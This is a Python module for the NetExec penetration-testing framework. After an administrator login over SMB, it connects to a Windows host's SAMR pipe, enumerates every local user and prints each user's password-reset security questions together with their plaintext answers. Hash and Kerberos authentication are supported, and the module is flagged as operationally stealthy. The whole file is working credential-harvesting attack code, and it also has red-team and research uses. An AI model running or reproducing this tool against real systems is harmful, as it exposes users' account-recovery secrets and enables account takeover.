from impacket.dcerpc.v5 import samr, transport
from impacket.nt_errors import STATUS_MORE_ENTRIES
from impacket.dcerpc.v5.rpcrt import DCERPCException
import json


class NXCModule:
    """
    Module by Adamkadaban: @Adamkadaban
    Based on research from @0gtweet (@gtworek)

    Much of this code was copied from add_computer.py
    Reference: https://hackback.zip/2024/05/08/Remotely-Dumping-Windows-Security-Questions-With-Impacket.html
    """

    name = "security-questions"
    description = "Gets security questions and answers for users on computer"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module):
        pass

    def on_admin_login(self, context, connection):
        self.__domain = connection.domain
        self.__domainNetbios = connection.domain
        self.__kdcHost = connection.hostname + "." + connection.domain
        self.__target = self.__kdcHost
        self.__username = connection.username
        self.__password = connection.password
        self.__targetIp = connection.host
        self.__port = context.smb_server_port
        self.__aesKey = context.aesKey
        self.__hashes = context.hash
        self.__doKerberos = connection.kerberos
        self.__nthash = ""
        self.__lmhash = ""

        if context.hash and ":" in context.hash[0]:
            hashList = context.hash[0].split(":")
            self.__nthash = hashList[-1]
            self.__lmhash = hashList[0]
        elif context.hash and ":" not in context.hash[0]:
            self.__nthash = context.hash[0]
            self.__lmhash = "00000000000000000000000000000000"

        self.getSAMRResetInfo(context)

    def getSAMRResetInfo(self, context):
        stringbinding = f"ncacn_np:{self.__targetIp}[\\pipe\\samr]"
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(445)
        rpctransport.setRemoteHost(self.__targetIp)

        if hasattr(rpctransport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                         self.__nthash, self.__aesKey)
        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        try:
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            # obtain server handle for samr connection
            resp = samr.hSamrConnect(dce)
            serverHandle = resp["ServerHandle"]

            resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
            domains = resp["Buffer"]["Buffer"]

            resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domains[0]["Name"])

            # obtain domain handle for samr connection
            resp = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, domainId=resp["DomainId"])
            domainHandle = resp["DomainHandle"]

            status = STATUS_MORE_ENTRIES
            enumerationContext = 0

            # try to iterate through users in domain entries for connection
            while status == STATUS_MORE_ENTRIES:
                try:
                    resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, enumerationContext=enumerationContext)
                except DCERPCException as e:
                    if str(e).find("STATUS_MORE_ENTRIES") < 0:
                        raise 
                    resp = e.get_packet()

                for user in resp["Buffer"]["Buffer"]:
                    # request SAMR ID 30
                    # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6
                    r = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, user["RelativeId"])
                    info = samr.hSamrQueryInformationUser2(dce, r["UserHandle"], samr.USER_INFORMATION_CLASS.UserResetInformation)

                    resetData = info["Buffer"]["Reset"]["ResetData"]
                    if resetData == b"":
                        break
                    resetData = json.loads(resetData)
                    questions = resetData["questions"]

                    if len(questions) == 0:
                        context.log.highlight(f"User {user['Name']} has no security questions")
                    else:
                        for qna in questions:
                            question = qna["question"]
                            answer = qna["answer"]
                            context.log.highlight(f"{user['Name']} - {question}: {answer}")

                    samr.hSamrCloseHandle(dce, r["UserHandle"])
                enumerationContext = resp["EnumerationContext"]
                status = resp["ErrorCode"]

        except Exception as e:
            print(str(e))

        finally:
            if domainHandle is not None:
                samr.hSamrCloseHandle(dce, domainHandle)
            if serverHandle is not None:
                samr.hSamrCloseHandle(dce, serverHandle)
            dce.disconnect()
